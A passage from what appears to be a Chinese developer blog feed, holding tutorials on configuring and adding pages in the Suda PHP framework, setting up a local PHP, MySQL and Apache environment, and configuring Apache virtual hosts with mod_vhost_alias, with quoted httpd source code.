<span class="attr">"namespace"</span>: <span class="string">"cn\\atd3"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"1.0-dev"</span>,</span><br><span class="line">    <span class="attr">"application"</span>: <span class="string">"suda\\core\\Application"</span>,</span><br><span class="line">    <span class="attr">"modules"</span>: [<span class="string">"suda"</span>, <span class="string">"app"</span>],</span><br><span class="line">    <span class="attr">"reachable"</span>: [<span class="string">"app"</span>],</span><br><span class="line">    <span class="attr">"language"</span>: <span class="string">"zh-CN"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: &#123;</span><br><span class="line">        <span class="attr">"mode"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"beautify"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">"rewrite"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="属性说明"><a href="#属性说明" class="headerlink" title="属性说明"></a>属性说明</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>name</td><td>应用的名字</td></tr><tr><td>language</td><td>应用的语言</td></tr><tr><td>modules</td><td>应用加载的功能模块</td></tr><tr><td>reachable</td><td>应用可以使用的模块</td></tr></tbody></table><p>其中，应用的模块放置在 <code>app/module</code> 目录下，现在只有一个模块 <code>app</code>，其中 <code>suda</code> 模块为内置模块</p><h3 id="应用配置文件-app-resource-config-config-json"><a href="#应用配置文件-app-resource-config-config-json" class="headerlink" title="应用配置文件 app/resource/config/config.json"></a>应用配置文件 app/resource/config/config.json</h3><p>该文件包含了应用的默认配置：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"debug"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"timelimit"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"timezone"</span>: <span class="string">"PRC"</span>,</span><br><span class="line">    <span class="attr">"markVersion"</span>:<span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"database"</span>: &#123;</span><br><span class="line">        <span class="attr">"prefix"</span>: <span class="string">"dx_"</span>, </span><br><span class="line">        <span class="attr">"host"</span>: <span class="string">"127.0.0.1"</span>, </span><br><span class="line">        <span class="attr">"port"</span>: <span class="number">3306</span>,</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"suda_system"</span>, </span><br><span class="line">        <span class="attr">"user"</span>: <span class="string">"root"</span>,</span><br><span class="line">        <span class="attr">"passwd"</span>: <span class="string">"root"</span>, </span><br><span class="line">        <span class="attr">"charset"</span>: <span class="string">"utf8"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"non-static"</span>: <span class="string">"php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="属性说明-1"><a href="#属性说明-1" class="headerlink" title="属性说明"></a>属性说明</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>debug</td><td>开启Debug模式，默认开启，会被覆盖</td></tr><tr><td>timelimit</td><td>PHP允许的最长运行时间，0表示无限</td></tr><tr><td>timezone</td><td>设置时区，PRC 中国</td></tr><tr><td>markVersion</td><td>显示版本头，在HTTP头部可以看到版本信息</td></tr><tr><td>database</td><td>数据库配置信息</td></tr></tbody></table><h2 id="如何创建一个页面"><a href="#如何创建一个页面" class="headerlink" title="如何创建一个页面"></a>如何创建一个页面</h2><p>在框架中，所有的页面都依赖于模块而生存，我们来看看 <code>app/modules/app</code> 文件夹，也就是app模块，<br>其中，控制页面URL的文件在模块目录下的 <code>resource/config/router.json</code> 文件中。我们看看该文件的内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"index"</span>: &#123;</span><br><span class="line">        <span class="attr">"class"</span>: <span class="string">"cn\\atd3\\response\\IndexResponse"</span>,</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该文件内包含了一个页面的路由，既访问 <code>/</code> 时调用 <code>cn\\atd3\\response\\IndexResponse</code> 类，本次我们就暂时不讲解调用类，现在就新建一个静态页面即可。</p><h3 id="步骤1：添加一个页面模板"><a href="#步骤1：添加一个页面模板" class="headerlink" title="步骤1：添加一个页面模板"></a>步骤1：添加一个页面模板</h3><p>添加页面模板的位置在模块目录下：<code>resource/template/模板名/</code>，其中模板名用default作为默认的模板名，现在往里面加入一个HTML页面,文件名为 <code>hello.tpl.html</code>, 注意，扩展名：<strong>tpl.html</strong></p><blockquote><p>resource/template/default/hello.tpl.html</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="步骤2：添加URL引用"><a href="#步骤2：添加URL引用" class="headerlink" title="步骤2：添加URL引用"></a>步骤2：添加URL引用</h3><p>我们创建好页面之后，需要用URL来引用整个页面。在 <code>resource/config/router.json</code> </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"index"</span>: &#123;</span><br><span class="line">        <span class="attr">"class"</span>: <span class="string">"cn\\atd3\\response\\IndexResponse"</span>,</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"hello"</span>: &#123;</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/hello"</span>,</span><br><span class="line">        <span class="attr">"template"</span>: <span class="string">"hello"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hello</code> 为URL的名字，<code>template</code> 指定的为URL加载的模板，这里省略 <code>.tpl.html</code> ，<code>url</code>指定了访问时的URL</p><p>现在的目录结构如下</p><p><img src="4.png" alt=""></p><p>此时我们访问页面 ：domain.com/hello 我们会发现是404页面，原因是页面加载了缓存，减低性能消耗</p><p><img src="5.png" alt=""></p><p>现在我们需要实时访问。则访问：domain.com/dev.php/hello ，其中 dev.php 是开发时入口。会清理缓存并重新写入</p><p><img src="/images/placeholder.png" alt="" data-src="6.png" class="lazyload"></p><p>由此，一个静态页面就加入成功了。</p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 01 基础开发环境项目配置</title>
      <link href="/2018/07/30/suda-env-build/"/>
      <url>/2018/07/30/suda-env-build/</url>
      <content type="html"><![CDATA[<p>本次基础教程讲解一个我自己开发的Web框架项目的使用，学习前，请保证自己看得懂PHP</p><a id="more"></a><h2 id="开发环境要求"><a href="#开发环境要求" class="headerlink" title="开发环境要求"></a>开发环境要求</h2><ul><li>运行环境<ul><li>Windows x86 | Windows x64</li><li>PHP 7.2.x</li><li>MySQL | MariaDB 数据库</li><li>Apache 2.x</li></ul></li><li>框架要求<ul><li>版本 1.2.15 以及以上</li></ul></li></ul><p><strong>说明</strong>：框架内使用了很多PHP新特性，所以会一直保持PHP的更新迭代，请保证框架使用最新PHP运行，也是提高网站项目运行性能的一个好方法。</p><h2 id="开发环境安装"><a href="#开发环境安装" class="headerlink" title="开发环境安装"></a>开发环境安装</h2><ul><li><p>PHP服务器集成环境推荐：</p><ul><li><p>PHP Study <a href="http://phpstudy.php.cn/phpstudy/PhpStudy20180211.zip" target="_blank" rel="noopener">http://phpstudy.php.cn/phpstudy/PhpStudy20180211.zip</a></p><p>  PHPStudy的可用PHP 7.2版本，内置 yaml 扩展</p><ul><li>PHP 7.2.1 <a href="http://atd-data.cdn.h-k.pw/20180730/4/4_jTvR4r32_php-7.2.1-nts.zip" target="_blank" rel="noopener">http://atd-data.cdn.h-k.pw/20180730/4/4_jTvR4r32_php-7.2.1-nts.zip</a></li></ul></li><li><p>LAMPP/XAMPP </p><ul><li>Windows <a href="https://www.apachefriends.org/xampp-files/7.2.7/xampp-win32-7.2.7-0-VC15-installer.exe" target="_blank" rel="noopener">https://www.apachefriends.org/xampp-files/7.2.7/xampp-win32-7.2.7-0-VC15-installer.exe</a></li><li>Linux <a href="https://www.apachefriends.org/xampp-files/7.2.7/xampp-linux-x64-7.2.7-0-installer.run" target="_blank" rel="noopener">https://www.apachefriends.org/xampp-files/7.2.7/xampp-linux-x64-7.2.7-0-installer.run</a></li></ul></li></ul></li><li>PHP 扩展 <ul><li>php_pdo_mysql（内置）</li><li>php_yaml （可选 1.2.16支持采用 yaml作为配置文件格式）</li></ul></li><li><p>Suda 框架</p><p>  直接克隆项目即可：<a href="https://github.com/DXkite/suda.git" target="_blank" rel="noopener">https://github.com/DXkite/suda.git</a></p></li></ul><h2 id="框架配置相关"><a href="#框架配置相关" class="headerlink" title="框架配置相关"></a>框架配置相关</h2><p>克隆项目后，将网站根目录调整到 <code>public</code> 目录下，访问URL domain.com/dev.php<br>出现如下界面类似则算框架安装成功：</p><p><img src="1.png" alt=""></p><p>如果不是这个界面则根据报错修改相关错误</p><h3 id="错误1：数据库账号密码错误"><a href="#错误1：数据库账号密码错误" class="headerlink" title="错误1：数据库账号密码错误"></a>错误1：数据库账号密码错误</h3><p><img src="2.png" alt=""></p><p>如果出现上述报错，说明你的MySQL的数据库账号密码错误，解决方案：</p><ul><li>方案1：修改数据库的账号密码为 root</li><li>方案2：修改配置文件 <code>app/resource/config/config.json</code></li></ul><p>配置文件默认内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"debug"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"timelimit"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"timezone"</span>: <span class="string">"PRC"</span>,</span><br><span class="line">    <span class="attr">"markVersion"</span>:<span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"database"</span>: &#123;</span><br><span class="line">        <span class="attr">"prefix"</span>: <span class="string">"dx_"</span>, </span><br><span class="line">        <span class="attr">"host"</span>: <span class="string">"127.0.0.1"</span>, </span><br><span class="line">        <span class="attr">"port"</span>: <span class="number">3306</span>,</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"suda_system"</span>, </span><br><span class="line">        <span class="attr">"user"</span>: <span class="string">"root"</span>,</span><br><span class="line">        <span class="attr">"passwd"</span>: <span class="string">"root"</span>, </span><br><span class="line">        <span class="attr">"charset"</span>: <span class="string">"utf8"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"non-static"</span>: <span class="string">"php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中属性 <code>database</code> 为数据库配置</p><h3 id="错误2：数据库驱动丢失"><a href="#错误2：数据库驱动丢失" class="headerlink" title="错误2：数据库驱动丢失"></a>错误2：数据库驱动丢失</h3><p><img src="3.png" alt=""></p><p>如果出现上述错误，找到你的PHP的配置文件 <code>php.ini</code> 全局搜索 <code>extension=php_pdo_mysql</code></p><p><img src="4.png" alt=""></p><p>将前面的 <code>;</code> 去掉即可</p><h3 id="错误3：PHP版本错误"><a href="#错误3：PHP版本错误" class="headerlink" title="错误3：PHP版本错误"></a>错误3：PHP版本错误</h3><p><img src="5.png" alt=""></p><p>如果出现上述错误，在<a href="http://php.net" target="_blank" rel="noopener">PHP官网</a>下载版本为 <code>PHP7.2</code><br>如下版本为 PHP 7.2.1 ，加入了 yml 配置文件支持。<a href="http://atd-data.cdn.h-k.pw/20180730/4/4_jTvR4r32_php-7.2.1-nts.zip" target="_blank" rel="noopener">下载 PHP 7.2.1</a> </p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Apache 实现一域一文件夹的虚拟主机配置</title>
      <link href="/2018/07/27/apache-vhost-alias-conf/"/>
      <url>/2018/07/27/apache-vhost-alias-conf/</url>
      <content type="html"><![CDATA[<p>在开发网站的过程中，使用Apache做为主要服务器的时候一般都是 <code>localhost</code> 访问网站，访问的时候只能一次访问一个网站域，在本文中将讲解如何配合 <code>hosts</code> 文件来控制访问的网站程序</p><a id="more"></a><h2 id="Apache-实现虚拟主机根目录"><a href="#Apache-实现虚拟主机根目录" class="headerlink" title="Apache 实现虚拟主机根目录"></a>Apache 实现虚拟主机根目录</h2><p><strong>前置条件</strong>：虚拟主机目录必须在主机目录下<br><strong>依赖模块</strong>：<code>mod_vhost_alias</code></p><p>格式说明 （<code>VirtualDocumentRoot</code>） 语法格式：<code>%-N+.-M+</code></p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>%%</td><td>百分号转义</td></tr><tr><td>%N</td><td>N为任意数字，负号表示从后面开始</td></tr><tr><td>%N.M</td><td>M表示截取N的子字符</td></tr><tr><td>+</td><td>表示包含当前位置以及以后的位置</td></tr></tbody></table><p>具体实现要求： </p><ol><li>访问 <code>www.dxkite.org</code> 时加载 <code>${DocumentRoot}/dxkite.org/www/public</code> 下的网站程序</li><li>访问 <code>dxkite.org</code> 时加载 <code>${DocumentRoot}/dxkite.org/www/public</code> 下的网站程序</li><li>访问 <code>$1.org</code> 时加载 <code>${DocumentRoot}/$1/www/public</code> 下的网站程序</li><li>访问 <code>$1.$2.org</code> 时加载 <code>${DocumentRoot}/$2/$1/public</code> 下的网站程序</li><li>访问 <code>localhost</code> 或者 ip 定位到 <code>${DocumentRoot}/localhost/public</code> 下的网络程序</li></ol><p>不难看出，要求 1 是要求 3的特殊情况</p><blockquote><p>dxkite.org –&gt; 导向本地开发网站</p></blockquote><h2 id="域名分割例子"><a href="#域名分割例子" class="headerlink" title="域名分割例子"></a>域名分割例子</h2><table><thead><tr><th>域名</th><th>参数</th><th>结果</th></tr></thead><tbody><tr><td>test.dxkite.cn</td><td>%0</td><td>test.dxkite.cn</td></tr><tr><td>test.dxkite.cn</td><td>%1</td><td>test</td></tr><tr><td>test.dxkite.cn</td><td>%2</td><td>dxkite</td></tr><tr><td>test.dxkite.cn</td><td>%2+</td><td>dxkite.cn</td></tr><tr><td>test.dxkite.cn</td><td>%1.2</td><td>e</td></tr></tbody></table><h2 id="具体规则"><a href="#具体规则" class="headerlink" title="具体规则"></a>具体规则</h2><h3 id="规则-5"><a href="#规则-5" class="headerlink" title="规则 5"></a>规则 5</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> <span class="attr">_default_:80</span>&gt;</span></span><br><span class="line">    DocumentRoot "D:\Server\localhost\public"</span><br><span class="line">    ErrorLog "D:\Server\logs\localhost.err"</span><br><span class="line">    CustomLog "D:\Server\logs\localhost.log" common</span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> "<span class="attr">D:</span>\<span class="attr">Server</span>\<span class="attr">localhost</span>\<span class="attr">public</span>"&gt;</span></span><br><span class="line">        Options -Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Order allow,deny</span><br><span class="line">        Allow from all</span><br><span class="line">        Require all granted</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="规则2"><a href="#规则2" class="headerlink" title="规则2"></a>规则2</h3><p>规则3无法目前通过其他方式实现（我暂未发现），暂实现特例规则2<br>参考实现方案：</p><ul><li>使用代理</li><li>使用URL重写</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">    ServerName dxkite.org</span><br><span class="line">    VirtualDocumentRoot "D:\Server\vhost\dxkite.org\www\public" </span><br><span class="line">    ErrorLog "D:\Server\logs\vhost_access.err"</span><br><span class="line">    CustomLog "D:\Server\logs\vhost_access.log" vhost_common</span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> "<span class="attr">D:</span>\<span class="attr">Server</span>\<span class="attr">vhost</span>\%<span class="attr">2</span>+\%<span class="attr">1</span>\<span class="attr">public</span>"&gt;</span></span><br><span class="line">        Options +Indexes +FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Order allow,deny</span><br><span class="line">        Allow from all</span><br><span class="line">        Require all granted</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="规则-3"><a href="#规则-3" class="headerlink" title="规则 3"></a>规则 3</h3><p>如果要添加其他域名的话，就在后面加就可以了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">    ServerAlias dxkite.org atd3.org</span><br><span class="line">    VirtualDocumentRoot "D:\Server\vhost\%0\www\public" </span><br><span class="line">    ErrorLog "D:\Server\logs\vhost_access.err"</span><br><span class="line">    CustomLog "D:\Server\logs\vhost_access.log" vhost_common</span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> "<span class="attr">D:</span>\<span class="attr">Server</span>\<span class="attr">vhost</span>\%<span class="attr">0</span>\<span class="attr">www</span>\<span class="attr">public</span>"&gt;</span></span><br><span class="line">        Options +Indexes +FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Order allow,deny</span><br><span class="line">        Allow from all</span><br><span class="line">        Require all granted</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="规则-1，4"><a href="#规则-1，4" class="headerlink" title="规则 1，4"></a>规则 1，4</h3><p><strong>注意</strong>: * 表示匹配所有、 ? 匹配单个字符 (官网没找到解释，看源码)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">    ServerAlias *</span><br><span class="line">    VirtualDocumentRoot "D:\Server\vhost\%2+\%1\public" </span><br><span class="line">    ErrorLog "D:\Server\logs\vhost_access.err"</span><br><span class="line">    CustomLog "D:\Server\logs\vhost_access.log" vhost_common</span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> "<span class="attr">D:</span>\<span class="attr">Server</span>\<span class="attr">vhost</span>\%<span class="attr">2</span>+\%<span class="attr">1</span>\<span class="attr">public</span>"&gt;</span></span><br><span class="line">        Options +Indexes +FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Order allow,deny</span><br><span class="line">        Allow from all</span><br><span class="line">        Require all granted</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong> 虚拟主机配置规则有顺序要求</p><blockquote><p><strong>参考文献</strong><br><a href="http://httpd.apache.org/docs/2.0/en/vhosts/" target="_blank" rel="noopener">http://httpd.apache.org/docs/2.0/en/vhosts/</a><br><a href="http://httpd.apache.org/docs/2.2/mod/mod_rewrite.html" target="_blank" rel="noopener">http://httpd.apache.org/docs/2.2/mod/mod_rewrite.html</a><br><a href="http://httpd.apache.org/docs/current/mod/mod_proxy.html" target="_blank" rel="noopener">http://httpd.apache.org/docs/current/mod/mod_proxy.html</a></p></blockquote></blockquote><p><strong>虚拟主机参考源码</strong></p><blockquote><p>httpd-2.4.34/server/vhost.c:894~925<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* return 1 if host matches ServerName or ServerAliases */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">matches_aliases</span><span class="params">(server_rec *s, <span class="keyword">const</span> <span class="keyword">char</span> *host)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">apr_array_header_t</span> *names;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* match ServerName */</span></span><br><span class="line">    <span class="keyword">if</span> (!strcasecmp(host, s-&gt;server_hostname)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* search all the aliases from ServerAlias directive */</span></span><br><span class="line">    names = s-&gt;names;</span><br><span class="line">    <span class="keyword">if</span> (names) &#123;</span><br><span class="line">        <span class="keyword">char</span> **name = (<span class="keyword">char</span> **) names-&gt;elts;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; names-&gt;nelts; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!name[i]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (!strcasecmp(host, name[i]))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    names = s-&gt;wild_names;</span><br><span class="line">    <span class="keyword">if</span> (names) &#123;</span><br><span class="line">        <span class="keyword">char</span> **name = (<span class="keyword">char</span> **) names-&gt;elts;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; names-&gt;nelts; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!name[i]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (!ap_strcasecmp_match(host, name[i]))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>httpd-2.4.34/server/util.c:211~234<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AP_DECLARE(<span class="keyword">int</span>) ap_strcasecmp_match(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">const</span> <span class="keyword">char</span> *expected)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (x = <span class="number">0</span>, y = <span class="number">0</span>; expected[y]; ++y, ++x) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!str[x] &amp;&amp; expected[y] != <span class="string">'*'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (expected[y] == <span class="string">'*'</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (expected[++y] == <span class="string">'*'</span>);</span><br><span class="line">            <span class="keyword">if</span> (!expected[y])</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (str[x]) &#123;</span><br><span class="line">                <span class="keyword">int</span> ret;</span><br><span class="line">                <span class="keyword">if</span> ((ret = ap_strcasecmp_match(&amp;str[x++], &amp;expected[y])) != <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (expected[y] != <span class="string">'?'</span></span><br><span class="line">                 &amp;&amp; apr_tolower(str[x]) != apr_tolower(expected[y]))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (str[x] != <span class="string">'\0'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="修改Hosts文件使其域名生效"><a href="#修改Hosts文件使其域名生效" class="headerlink" title="修改Hosts文件使其域名生效"></a>修改Hosts文件使其域名生效</h2><p>修改 Windows 或者 Linux 的 Hosts 文件使其遇到某个域名时定向到本地域</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 